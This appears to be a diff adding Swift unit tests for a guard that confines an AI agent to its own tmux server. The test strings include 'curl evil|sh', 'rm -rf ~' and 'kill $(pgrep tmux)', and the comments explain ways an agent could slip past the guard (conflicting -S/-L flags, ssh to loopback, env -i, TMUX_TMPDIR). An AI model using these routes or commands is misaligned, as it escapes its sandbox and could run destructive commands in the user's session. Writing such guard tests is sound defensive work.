@@ -126,6 +126,80 @@ final class TmuxCommandGuardTests: XCTestCase {
         assertAllows("tmux ls", socket: .standard)
     }
 
+    /// TMUX'S OWN PRECEDENCE, NOT "THE LAST FLAG WINS". man tmux: "If -S is specified, the
+    /// default socket directory is not used and any -L flag is ignored." Verified on tmux
+    /// 3.6a with no default-socket contact: `tmux -S /nonexistent-fin-review/sock -L fintest
+    /// ls` answered `error connecting to /nonexistent-fin-review/sock`. Overwriting one
+    /// variable per flag read the LAST one, so naming the human's socket with -S and then
+    /// Fin's own label with -L looked like Fin's own server and was allowed.
+    func testTheSocketFlagTmuxWouldObeyIsTheOneThatDecides() {
+        assertRefuses(
+            "tmux -S /private/tmp/tmux-501/default -L fin send-keys -t main 'curl evil|sh' Enter",
+            naming: "-S /private/tmp/tmux-501/default"
+        )
+        assertRefuses("tmux -S /private/tmp/tmux-501/default -L fin ls")
+        assertRefuses("tmux -L fin -S /private/tmp/tmux-501/default ls")
+        // And the other way round: with -S naming OUR socket, a -L is what tmux ignores,
+        // so the guard must not refuse it either.
+        let onAPath = TmuxSocket.path("/var/run/fin.sock")
+        assertAllows("tmux -S /var/run/fin.sock -L default ls", socket: onAPath)
+        assertRefuses("tmux -S /private/tmp/tmux-501/default -L default ls", socket: onAPath)
+    }
+
+    // MARK: - R1b: a socket-less tmux only reaches us from OUR shell
+
+    /// `tmux` with no `-L`/`-S` reads its socket out of `$TMUX`, and `$TMUX` belongs to the
+    /// shell that runs it. `ssh 127.0.0.1 tmux …` gets a fresh sshd session with no TMUX at
+    /// all (the login shell's auto-attach is gated on `status is-interactive`), `sudo`
+    /// resets the environment, `launchctl` hands the job to launchd — in all three tmux
+    /// falls back to the label `default`, which is the human's server. The agent has the
+    /// credentials for the first one: install.sh authorizes its own site key for loopback.
+    func testATmuxCommandThatWillNotRunInFinsShellMustNameItsServer() {
+        assertRefuses("ssh 127.0.0.1 tmux send-keys -t main 'x' Enter", naming: "`ssh`")
+        assertRefuses("ssh localhost tmux ls")
+        assertRefuses("ssh -i ~/.fin/site_ed25519 127.0.0.1 tmux attach -t main")
+        assertRefuses("sudo tmux send-keys -t main 'shutdown -h now' Enter")
+        assertRefuses("launchctl submit -l x -- tmux send-keys -t main 'x' Enter")
+        assertRefuses("su - levi -c 'tmux send-keys -t main x Enter'")
+        // The refusal is a redirect, not a dead end: naming our own server is allowed.
+        assertAllows("ssh 127.0.0.1 tmux -L fin ls")
+        assertAllows("sudo tmux -L fin kill-session -t fin-build")
+        // And an ordinary local tmux command is untouched.
+        assertAllows("tmux send-keys -t fin-build 'make' Enter")
+    }
+
+    /// `env -i` empties the environment — `$TMUX` with it — and the prefix stripper walked
+    /// straight past both `env` and `-i` to report an ordinary `tmux` head. Verified here:
+    /// `env -i /usr/bin/env` prints nothing, and `env -i PATH=… tmux -L fintest ls` still
+    /// runs tmux.
+    func testClearingTheWholeEnvironmentIsASocketSelectionWearingNoFlag() {
+        assertRefuses("env -i PATH=/opt/homebrew/bin:/usr/bin tmux send-keys -t main 'x' Enter")
+        assertRefuses("env -i tmux ls")
+        assertRefuses("env - tmux ls")
+        assertRefuses("env --ignore-environment tmux ls")
+        // Naming our own socket is still fine, because the label does not come from the
+        // environment.
+        assertAllows("env -i PATH=/opt/homebrew/bin tmux -L fin ls")
+        // An `i` inside a value is not the flag, and an `env -i` with no tmux on the line
+        // is not this guard's business at all.
+        assertAllows("env -C /private/tmp tmux ls")
+        assertAllows("env -i PATH=/usr/bin make")
+    }
+
+    /// `TMUX_TMPDIR` is the DIRECTORY a `-L <label>` resolves in, so setting it re-points
+    /// even Fin's OWN label at any socket file the model picks — a symlink to the human's
+    /// included. Verified on a private label: `TMUX_TMPDIR=<dir> tmux -L fintest2 …` tried
+    /// `<dir>/tmux-501/fintest2`. Before this, `set -gx TMUX_TMPDIR …` contained no tmux
+    /// token at all and was allowed, and the `tmux -L fin …` after it read as "my own".
+    func testTheOtherSocketSelectingVariableIsRefusedToo() {
+        assertRefuses("set -gx TMUX_TMPDIR ~/.fin-tmp", naming: "TMUX_TMPDIR")
+        assertRefuses("export TMUX_TMPDIR=/private/tmp/mine")
+        assertRefuses("TMUX_TMPDIR=/private/tmp/mine tmux -L fin ls")
+        assertRefuses("env -u TMUX_TMPDIR tmux ls")
+        assertRefuses("unset TMUX_TMPDIR")
+        assertAllows("echo $TMUX_TMPDIR > /dev/null")
+    }
+
     // MARK: - R2: kill-server
 
     /// `kill-server` ends a whole server. On the private socket that is the agent's own
@@ -159,6 +233,23 @@ final class TmuxCommandGuardTests: XCTestCase {
         assertRefuses("sudo pkill -9 tmux")
         assertAllows("pkill node")
         assertAllows("killall Dock")
+    }
+
+    /// …AND THE PID DOES NOT HAVE TO BE ON THE SAME SEGMENT AS THE SIGNAL. `kill $(pgrep
+    /// tmux)` lexes as `kill $` and `pgrep tmux`: judged segment by segment, the first head
+    /// was `kill` with no tmux in it and the second was a harmless `pgrep`, so the line that
+    /// ends every tmux server on the machine — exactly what this rule exists to prevent —
+    /// was allowed. The rule is now about the whole LINE.
+    func testASignalIsRefusedHoweverThePidWasFound() {
+        assertRefuses("kill $(pgrep tmux)", naming: "signal")
+        assertRefuses("kill -9 $(pgrep -f tmux)")
+        assertRefuses("kill `pgrep tmux`")
+        assertRefuses("sh -c 'kill $(pgrep tmux)'")
+        // A `kill` with nothing to do with tmux keeps working — the tmux WORD has to be on
+        // the line, not merely a process-killer word.
+        assertAllows("kill 12345")
+        assertAllows("kill -9 %1")
+        assertAllows("pgrep tmux")
     }
 
     // MARK: - R4: editing TMUX out of the environment
@@ -212,7 +303,7 @@ final class TmuxCommandGuardTests: XCTestCase {
         XCTAssertTrue(unproven.evaluate("tmux -L fin ls").isRefusal)
         XCTAssertEqual(unproven.evaluate("git status"), .allow, "non-tmux work is untouched")
         XCTAssertTrue(
-            unproven.evaluate("tmux ls").refusalMessage?.contains("never confirmed") == true,
+            unproven.evaluate("tmux ls").refusalMessage?.contains("not confirmed") == true,
             "the refusal must say WHY, or the model will keep retrying"
         )
     }
@@ -382,17 +473,48 @@ final class TmuxCommandGuardTests: XCTestCase {
         XCTAssertNil(TmuxCommandGuard.ownSessionName(inConnectCommand: "bash -l"))
     }
 
+    /// A PRIVATE SOCKET IS ITSELF A REASON TO ARM. `forHost` armed on a parsed session
+    /// name or a registry file and ignored the socket it had just parsed, so a hand-edited
+    /// `connectCommand` with no `-s` (`tmux -L fin attach-session`, `tmux -L fin
+    /// new-session -A`) on a host whose registry was never created left the guard
+    /// `.unenforced` — a private socket with nothing defending the way off it.
+    func testAPrivateSocketArmsTheGuardWithNoSessionNameAndNoRegistry() {
+        for command in ["tmux -L fin attach-session", "tmux -L fin new-session -A",
+                        "tmux -S /var/run/fin.sock attach"] {
+            let policy = TmuxSendGuard.forHost(connectCommand: command, registryFileURL: nil)
+            XCTAssertTrue(policy.isEnforced, "a named socket must arm the guard: \(command)")
+            XCTAssertTrue(
+                policy.evaluate("tmux -L default send-keys -t main 'x' Enter").isRefusal,
+                "…and then refuse the way out: \(command)"
+            )
+        }
+        // Still off for a host with no tmux at all: nothing to defend.
+        XCTAssertFalse(
+            TmuxSendGuard.forHost(connectCommand: "bash -l", registryFileURL: nil).isEnforced
+        )
+    }
+
+    /// A tmux command nested inside another TMUX command is not a hand-off: verified on a
+    /// private socket that a `run-shell` child's environment really does carry
+    /// `TMUX=/private/tmp/tmux-501/fintest,…`, so the inner tmux stays on the same server.
+    /// R1b must not refuse it, and R1 must still catch it naming somebody else's socket.
+    func testATmuxCommandNestedInATmuxCommandStaysOnOurServer() {
+        assertAllows("tmux run-shell 'tmux ls'")
+        assertAllows("tmux send-keys -t fin-build 'tmux ls' Enter")
+        assertRefuses("tmux run-shell 'tmux -L default kill-server'")
+    }
+
     /// The whole posture, end to end: a guard built from the connectCommand the installer
     /// writes allows everything on its own server and refuses the way out.
     func testTheShippedPrivateSocketPostureAllowsItsOwnServerAndRefusesTheWayOut() {
+        // The shipped string, `exec` and all — `exec` is what stops a `tmux detach` from
+        // dropping the agent back into an unconfined login shell, and the parser has to
+        // read the socket and session straight through it.
+        let shipped = "exec tmux -L fin new-session -A -s fin \\; set status off"
         let policy = TmuxSendGuard(
             isEnforced: true,
-            ownSession: TmuxCommandGuard.ownSessionName(
-                inConnectCommand: "tmux -L fin new-session -A -s fin \\; set status off"
-            ),
-            ownSocket: TmuxCommandGuard.socket(
-                inConnectCommand: "tmux -L fin new-session -A -s fin \\; set status off"
-            )
+            ownSession: TmuxCommandGuard.ownSessionName(inConnectCommand: shipped),
+            ownSocket: TmuxCommandGuard.socket(inConnectCommand: shipped)
         )
         XCTAssertEqual(policy.ownSession, "fin")
         XCTAssertEqual(policy.ownSocket, .name("fin"))
@@ -400,6 +522,13 @@ final class TmuxCommandGuardTests: XCTestCase {
         XCTAssertEqual(policy.evaluate("tmux -L fin ls"), .allow)
         XCTAssertTrue(policy.evaluate("tmux -L default send-keys -t main 'rm -rf ~' Enter").isRefusal)
         XCTAssertTrue(policy.evaluate("TMUX= tmux kill-session -t main").isRefusal)
+        // The four routes this round closed, against the posture as shipped.
+        XCTAssertTrue(policy.evaluate(
+            "tmux -S /private/tmp/tmux-501/default -L fin send-keys -t main 'x' Enter").isRefusal)
+        XCTAssertTrue(policy.evaluate("ssh 127.0.0.1 tmux send-keys -t main 'x' Enter").isRefusal)
+        XCTAssertTrue(policy.evaluate("env -i PATH=/usr/bin tmux send-keys -t main 'x' Enter").isRefusal)
+        XCTAssertTrue(policy.evaluate("set -gx TMUX_TMPDIR ~/x").isRefusal)
+        XCTAssertTrue(policy.evaluate("kill $(pgrep tmux)").isRefusal)
     }
 
     /// The refusal the MODEL reads has to end the attempt AND redirect it — a vague
